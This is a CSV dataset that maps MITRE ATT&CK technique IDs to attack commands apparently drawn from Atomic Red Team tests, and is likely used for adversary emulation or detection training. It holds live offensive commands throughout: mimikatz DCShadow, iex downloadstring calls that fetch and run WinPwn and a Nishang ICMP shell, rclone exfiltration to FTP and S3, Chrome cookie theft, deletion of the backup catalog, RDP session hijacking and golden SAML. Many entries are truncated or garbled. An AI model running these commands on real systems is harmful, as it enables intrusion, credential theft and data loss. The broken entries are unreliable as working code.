mitre_id,command
T1207,"#  starting  fake  dc  server,  as  system  (required)  $dc_output_file  =  ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log""  remove-item  $dc_output_file  -erroraction  ignore  $mimikatzparam  =""`""log  $dc_output_file`""  `""lsadump::dcshadow  \object:var_390""  ""lsadump::dcshadow  \push""  ""exit""  write-host  ""`nwaiting  for  fake  dc  server  to  return""  wait-process  $dc  write-host  ""`noutput  from  fake  dc  server:""  get-content  $dc_output_file  start-sleep  1  #  wait  a  little  until  the  file  is  not  locked  anymore  so  we  can  actually  delete  it  remove-item  $dc_output_file  -erroraction  ignore  write-host  ""end  of  dcshadow"""
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1560,"mkdir  $pathtoatomicsfolder\t1560.001\victim-files  cd  $pathtoatomicsfolder\t1560.001\victim-files  echo  ""this  file  will  be  encrypted""  >  .\encrypted_file.txt  ""var_318""  u  archive.7z  *txt  -pblue  dir"
T1069,get-aduser -f * -pr doesnotrequirepreauth | where {$_.doesnotrequirepreauth -eq $true}
T1132,"$plaintext  =  ([system.text.encoding]::utf8.getbytes(""var_129  -method  post  -body  $cyphertext  -disablekeepalive"
T1204,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1""  -usebasicparsing)  $macrocode  =  ""  open  `""var_668"""
T1220,"wmic  var_442"""
T1218,"hh.exe -decompile %temp% ""#{local_chm_file}"""
T1098,"$credfile = ""var_787"
T1614,localectl status
T1497,if (ioreg -l | grep -e manufacturer -e 'vendor name' | grep -ie 'oracle|virtualbox|vmware|parallels') then echo 'virtualization environment detected'; fi;
T1197,bitsadmin.exe \transfer \download \priority foreground var_290
T1049,sockstat -4 sockstat -6 2>\dev\null || true sockstat -l 2>\dev\null || true
T1048,"$rclone_bin = get-childitem c:\users\public\downloads\ -recurse -include ""rclone.exe"" | select-object -expandproperty fullname $exfil_pack = get-childitem c:\users\public\downloads\ -recurse -include ""exfil.zip"" | select-object -expandproperty fullname &$rclone_bin config create ftpserver ""ftp"" ""host"" #{ftp_server} ""port"" #{ftp_port} ""user"" #{ftp_user} ""pass"" #{ftp_pass} &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2m -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -p --ftp-no-check-certificate"
T1558,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') kerberoasting -consoleoutput -noninteractive
T1539,"$devtoolsport = 9222 $testurl = ""https:\\www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http:\\localhost:$devtoolsport\json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 2048 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force"
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtimedc \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtimeoffsetdc \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtime \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtimeoffset \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v enablesmartscreen \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v shellsmartscreenlevel \t reg_sz \d block \f"
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_970"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1556,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1490,wbadmin delete catalog -quiet
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_530"" net start sesshijack"
T1567,new-item  var_389:test  -v
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-domain-length.ps1 -dohserver var_829"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_500"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1007,tasklist.exe \svc sc query sc query state= all
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_121"""
T1001,"get-content ""var_815"" -encoding byte"
T1114,"$ss = convertto-securestring ""var_422"
T1114,"powershell -executionpolicy bypass -command ""var_315"
T1053,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}"
T1021,"copy %systemroot%\system32\calc.exe 'c:\users\var_204"")) $com.activatemicrosoftapp(""5"")"
T1072,"""%programfiles(x86)%\var_750"""
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_507
T1201,net accounts \domain
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'
T1078,dseditgroup -o edit -a art-user -t user admin
T1120,fsutil fsinfo drives
T1571,test-netconnection -computername var_552
T1105,"$machine_list = ""pathtoatomicsfolder\..\externalpayloads\t1105machinelist.txt"" $offline_list = ""pathtoatomicsfolder\..\externalpayloads\t1105offlinehosts.txt"" $completed_list = ""pathtoatomicsfolder\..\externalpayloads\t1105completedhosts.txt"" foreach ($machine in get-content -path ""$machine_list"") {if (test-connection -count 1 -computername $machine -quiet) {cmd \c copy ""var_520"
T1218,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/? `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_helptext_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil helptext property execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive\t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1218,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_700"
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_572"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1187,rpcping  -s  var_610  \a  connect  \u  ntlm  1>$null
T1005,"$startingdirectory = ""var_784"
T1037,"echo ""var_699"" \f"
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_617
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }"
T1112,"$s= new-cimsession -computername #{server_name} -sessionoption (new-cimsessionoption -protocol dcom) get-ciminstance -namespace root\standardcimv2 -classname msft_netfirewallrule -filter 'displayname=""remote desktop - shadow (tcp-in)""' -cimsession $s | invoke-cimmethod -methodname enable invoke-cimmethod -classname stdregprov -methodname setdwordvalue -arguments @{hdefkey=[uint32]2147483650; ssubkeyname=""software\policies\microsoft\windows nt\terminal services""; svaluename=""shadow""; uvalue=[uint32]2} -cimsession $s"
T1127,"copy ""var_453 %temp%\hello.js"
T1614,"$info = @{ uilanguage = get-winuilanguageoverride userlanguages = (get-winuserlanguagelist).languagetag -join ', ' systemlocale = get-winsystemlocale currentculture = [system.globalization.cultureinfo]::currentculture.name currentuiculture = [system.globalization.cultureinfo]::currentuiculture.name timezone = (get-timezone).id } $info.getenumerator() | foreach-object { ""$($_.name): $($_.value)"" }"
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe \all >> var_635\$file"
T1550,"var_271"""
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive\t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1496,yes > \dev\null
T1098,"$credfile  =  ""var_547"
T1489,sudo  kill  -sigterm  $(pgrep  var_216)
T1546,"reg add ""hkey_current_user\software\classes\atomictest"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\atomictest.1.00"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\atomictest\clsid"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\atomictest.1.00\clsid"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\inprocserver32"" /ve /t reg_sz /d ""c:\windows\system32\scrobj.dll"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\inprocserver32"" /v ""threadingmodel"" /t reg_sz /d ""apartment"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\progid"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\scriptleturl"" /ve /t reg_sz /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1546.015/src/treatas.sct"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\versionindependentprogid"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{97d47d56-3777-49fb-8e8f-90d7e30e1a1e}"" /f reg add ""hkey_current_user\software\classes\clsid\{97d47d56-3777-49fb-8e8f-90d7e30e1a1e}\treatas"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f rundll32.exe -sta ""atomictest"""
T1609,kubectl create -f var_129
T1016,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=subnet) #{optional_args}"
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') winpeas -noninteractive -consoleoutput
T1220,"wmic var_176"""
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_176 write-host ""end of golden saml"""
T1127,"var_499"""
T1047,wmic \user:var_553
T1030,$file = [system.io.file]::openread(var_767 $file.close()
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_682"" -verbose"
T1119,sc query type=service > %temp%\t1119_1.txt doskey \history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1496,yes > \dev\null
T1220,"""var_878"""
T1040,sudo var_221 -4 -p 6 -t 3
T1069,get-aduser -f * -pr doesnotrequirepreauth | where {$_.doesnotrequirepreauth -eq $true}
T1567,"write-host  ""deploying  aws  infrastructure...  ""  -nonewline  $awsaccesskey  =  ""var_775  ""@  $config  |  out-file  -filepath  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  -encoding  ascii  write-host  ""done!""  write-host  ""exfiltrating  data...  ""  -nonewline  $bucket  =  ""$(pathtoatomicsfolder\..\externalpayloads\t1567.002\terraform-v*\terraform  output  bucket)"".replace(""`"""","""")  cd  pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone-v*  $null  =  .\rclone  copy  --max-size  1700k  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\data\""  exfils3:$bucket  --config  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  write-host  ""done!"""
